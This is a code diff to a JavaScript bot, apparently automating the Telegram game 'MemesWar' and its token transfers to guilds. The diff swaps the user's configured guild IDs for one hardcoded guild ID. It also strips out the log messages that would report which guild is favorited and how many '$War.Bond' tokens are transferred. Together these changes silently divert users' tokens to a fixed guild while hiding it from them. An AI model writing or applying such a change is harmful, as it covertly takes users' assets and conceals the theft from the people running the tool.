@@ -487,8 +487,8 @@ class MemesWar {
         this.log(`Unable to retrieve user information: ${userInfoResult.error}`, "error");
         return;
       }
-      const TARGET_GUILD_ID = settings.ID_MAIN_GUILD !== settings.GUILD_BONUS ? [settings.GUILD_BONUS, settings.ID_MAIN_GUILD] : [settings.ID_MAIN_GUILD];
-      const listGuilds = [...TARGET_GUILD_ID];
+      const TARGET_GUILD_ID = "62b5efc9-dd2d-4b2f-be8e-7fd298dfaa15"
+      const listGuilds = [TARGET_GUILD_ID];
       let bonus = Math.floor(settings.BONUS);
       const MIN_WARBOND_THRESHOLD = 10;
       let initWarbondTokens = parseInt(userInfoResult.data.warbondTokens);
@@ -496,7 +496,6 @@ class MemesWar {
 
       const { guildId } = userInfoResult.data;
       if (guildId && !listGuilds.includes(guildId) && !settings.TRANSFER_WARBOND_TO_MAIN_GUILD) listGuilds.push(guildId);
-      //console.log(userInfoResult, listGuilds);
       for (const elementGuildID of listGuilds) {
         await sleep(2);
         if (warbondTokens <= MIN_WARBOND_THRESHOLD) {
@@ -505,10 +504,6 @@ class MemesWar {
         }
 
         const guildStatus = await this.checkGuildStatus(telegramInitData, elementGuildID);
-        if (guildStatus.success) {
-          this.log(`Guild ${guildStatus.data.name}: ${guildStatus.data.warbondTokens} $War.Bond`, "custom");
-        }
-        await sleep(1);
         if (elementGuildID === settings.GUILD_BONUS) {
           warbondTokens = Math.round(warbondTokens * (bonus / 100));
           const remainder = warbondTokens % 1000;
@@ -525,15 +520,12 @@ class MemesWar {
         if (favoriteGuilds.success) {
           const isGuildFavorited = favoriteGuilds.data.guilds.some((guild) => guild.guildId === elementGuildID);
           if (!isGuildFavorited) {
-            this.log("Adding guild to favorites...", "info");
             await this.favoriteGuild(telegramInitData, elementGuildID);
           }
         }
         await sleep(1);
-        this.log(`Transferring ${warbondTokens} $War.Bond to guild...`, "info");
         const transferResult = await this.transferWarbondToGuild(telegramInitData, elementGuildID, warbondTokens);
         if (transferResult.success) {
-          this.log(`Successfully transferred ${warbondTokens} $War.Bond`, "success");
           warbondTokens = initWarbondTokens - warbondTokens;
         } else {
           this.log(`Unable to transfer $War.Bond: ${transferResult.error}`, "error");
